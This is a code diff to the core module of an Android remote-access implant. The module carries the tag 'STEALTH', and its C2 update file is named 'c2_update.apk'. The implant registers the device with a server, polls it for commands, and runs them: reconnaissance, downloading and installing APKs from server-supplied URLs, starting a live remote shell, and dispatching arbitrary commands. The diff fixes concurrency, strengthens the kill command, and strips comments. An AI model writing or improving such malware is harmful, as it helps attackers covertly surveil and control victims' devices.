@@ -21,12 +21,12 @@ import java.util.concurrent.TimeUnit
 object Core {
     private const val TAG = "STEALTH"
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
-    private var deviceId: String = ""
-    private var username: String = ""
-    private var userId: String = ""
-    private var running = false
-    // Persisted in SharedPreferences — survives process death (e.g. system installer killing app)
-    private var executedCommandIds = java.util.Collections.synchronizedSet(mutableSetOf<String>())
+    @Volatile private var deviceId: String = ""
+    @Volatile private var username: String = ""
+    @Volatile private var userId: String = ""
+    @Volatile private var running = false
+    private val polling = java.util.concurrent.atomic.AtomicBoolean(false)
+    private var executedCommandIds: MutableSet<String> = java.util.Collections.synchronizedSet(mutableSetOf<String>())
     private lateinit var prefs: android.content.SharedPreferences
 
     private const val PREFS_NAME = "kaze_executed_cmds"
@@ -61,7 +61,6 @@ object Core {
                 Transport.registerDevice(deviceId, fingerprint, username, fpUserId)
                 Log.d(TAG, "Device registered (user=$username, uid=$fpUserId)")
 
-                // Reset any stale "running" commands from previous process freeze
                 Transport.cleanupStaleCommands(deviceId)
                 Log.d(TAG, "Stale commands cleaned")
 
@@ -133,6 +132,7 @@ object Core {
     }
 
     private fun pollAndExecute(context: Context) {
+        if (!polling.compareAndSet(false, true)) return
         try {
             val commands = Transport.pollCommands(deviceId)
             if (commands.isNotEmpty()) {
@@ -148,7 +148,6 @@ object Core {
                         continue
                     }
 
-                    // Skip download commands for older versions — prevents system installer loop
                     if (cmd.startsWith("download|")) {
                         val url = cmd.removePrefix("download|")
                         val versionRegex = Regex("""/v(\d+\.\d+\.\d+)/""")
@@ -171,18 +170,24 @@ object Core {
                         when {
                             cmd == "recon" -> Recon.execute(context)
                             cmd.startsWith("download|") -> downloadAndInstall(context, cmd.removePrefix("download|"))
-                            cmd == "die" -> { running = false; "BYE" }
+                            cmd == "die" -> {
+                                running = false
+                                try {
+                                    context.stopService(Intent(context, com.kaze.liveshell.LiveShellService::class.java))
+                                } catch (_: Exception) {}
+                                "BYE"
+                            }
                             cmd == "wake" -> "AWAKE"
                             cmd.startsWith("sh|") -> {
-                                val action = cmd.removePrefix("sh|").trim()
-                                if (action == "start") {
+                                val shAction = cmd.removePrefix("sh|").trim()
+                                if (shAction == "start") {
                                     startLiveShell(context)
                                     "LiveShell started"
-                                } else if (action == "stop") {
+                                } else if (shAction == "stop") {
                                     stopLiveShell(context)
                                     "LiveShell stopped"
                                 } else {
-                                    "Unknown sh action: $action"
+                                    "Unknown sh action: $shAction"
                                 }
                             }
                             else -> Commands.dispatch(context, cmd)
@@ -197,20 +202,20 @@ object Core {
                     Log.d(TAG, "Result sent: ${cmd.take(30)} (${result.length} bytes)")
                 }
             }
-            // Trim persisted set if it grows too large (keep last 500)
             if (executedCommandIds.size > 500) {
-                val asList = executedCommandIds.toList().takeLast(500)
-                executedCommandIds = asList.toMutableSet()
+                val trimmed = java.util.Collections.synchronizedSet(
+                    executedCommandIds.toList().takeLast(500).toMutableSet()
+                )
+                executedCommandIds = trimmed
                 saveExecutedIds()
             }
         } catch (e: Exception) {
             Log.e(TAG, "Poll error: ${e.message}")
+        } finally {
+            polling.set(false)
         }
     }
 
-    /**
-     * Compare two semver strings. Returns negative if a < b, 0 if equal, positive if a > b.
-     */
     private fun compareVersions(a: String, b: String): Int {
         val partsA = a.split(".").map { it.toIntOrNull() ?: 0 }
         val partsB = b.split(".").map { it.toIntOrNull() ?: 0 }
@@ -256,20 +261,19 @@ object Core {
             val apkFile = File(context.filesDir, "c2_update.apk")
 
             val request = Request.Builder().url(url).build()
-            val response = httpClient.newCall(request).execute()
-            if (!response.isSuccessful) {
-                return "ERROR:HTTP_${response.code}"
-            }
-            val body = response.body ?: return "ERROR:empty_body"
+            httpClient.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) {
+                    return "ERROR:HTTP_${response.code}"
+                }
+                val body = response.body ?: return "ERROR:empty_body"
 
-            apkFile.outputStream().use { out ->
-                body.byteStream().use { inp ->
-                    inp.copyTo(out)
+                apkFile.outputStream().use { out ->
+                    body.byteStream().use { inp ->
+                        inp.copyTo(out)
+                    }
                 }
             }
-            response.close()
 
-            // Verify it's a valid APK
             val magic = ByteArray(4)
             apkFile.inputStream().use { it.read(magic) }
             if (magic[0] != 0x50.toByte() || magic[1] != 0x4B.toByte()) {
